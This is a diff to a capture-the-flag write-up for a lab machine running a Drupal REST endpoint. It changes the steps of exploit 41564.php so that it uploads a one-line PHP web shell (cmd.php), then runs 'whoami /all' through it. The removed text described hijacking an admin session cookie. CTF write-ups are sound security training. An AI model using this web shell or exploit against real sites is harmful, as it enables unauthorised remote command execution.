@@ -55,7 +55,18 @@ Test **http://10.10.10.9/rest** on the browser or using **curl**.
 
 Modify the below lines in the exploit code:
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4da43bf7-5ca8-4fdf-ab20-f738bcc18380)
+```
+$url = 'http://10.10.10.9';
+$endpoint_path = '/rest';
+$endpoint = 'rest_endpoint';
+
+$file = [
+    'filename' => 'cmd.php',
+    'data' => '<?php system($_GET["cmd"]); ?>'
+];
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b01489e0-aa1c-4305-ae2f-d9ae3dbd4b2b)
 
 Run the exploit: `php 41564.php`
 
@@ -65,23 +76,13 @@ In case of **PHP Fatal error:  Uncaught Error: Call to undefined function curl_i
 
 Rerun the exploit: `php 41564.php`
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c9ce7b40-75f7-4047-bd2f-bfcc56c55d26)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab1d4ce6-aee4-4848-ba58-e3312d37e1c2)
 
-It creates 2 files: **session.json** and **user.json**. View the content of **session.json**.
+It creates 2 files: **session.json** and **user.json**. 
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e77c653b-928b-4d12-84a1-3cff4f22c232)
+Execute **http://10.10.10.9/cmd.php?cmd=whoami%20/all**
 
-**session.json** file gives a valid session cookie for admin user.
-
-Add the cookie with the Cookie Editor plugin on the browser:
-
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4210ab1b-d35e-4598-b99c-08e18a850221)
-
-Refresh the browser:
-
-
-
-
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/557645c5-3039-4d4c-ab37-c4e5a0a724b8)
 
 
 ## Exploitation & Gaining Access
